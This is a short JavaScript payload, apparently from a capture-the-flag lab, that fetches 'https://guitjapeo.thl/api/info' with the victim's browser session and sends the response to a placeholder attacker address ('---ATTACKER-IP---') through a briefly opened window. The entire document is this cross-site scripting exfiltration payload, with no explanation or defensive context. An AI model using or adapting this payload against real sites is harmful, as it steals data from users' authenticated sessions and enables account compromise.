var xhr = new XMLHttpRequest();
xhr.onreadystatechange = () =>{
        if(xhr.readyState == XMLHttpRequest.DONE){
                openwindow = window.open("http://---ATTACKER-IP---/?exfil=" + xhr.response);
                setTimeout(()=>openwindow.close(),500)
        }
};
xhr.open('GET',"https://guitjapeo.thl/api/info",false);
xhr.send();
